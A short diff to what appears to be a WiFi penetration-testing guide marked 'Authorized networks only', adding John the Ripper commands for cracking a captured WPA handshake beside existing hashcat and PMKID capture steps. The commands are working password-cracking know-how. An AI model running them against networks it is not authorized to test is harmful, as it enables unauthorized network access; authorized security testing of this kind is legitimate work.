@@ -24,6 +24,10 @@ Authorized networks only.
     # or GPU:
     hcxpcapngtool -o hash.22000 capture-01.cap
     hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
+    # or John the Ripper (CPU):
+    aircrack-ng capture-01.cap -j out
+    hccap2john out.hccap > wpa.john
+    john --wordlist=/usr/share/wordlists/rockyou.txt wpa.john
 
 6.  PMKID (clientless):
     sudo hcxdumptool -i wlan0mon -w pmkid.pcapng --enable_status=1
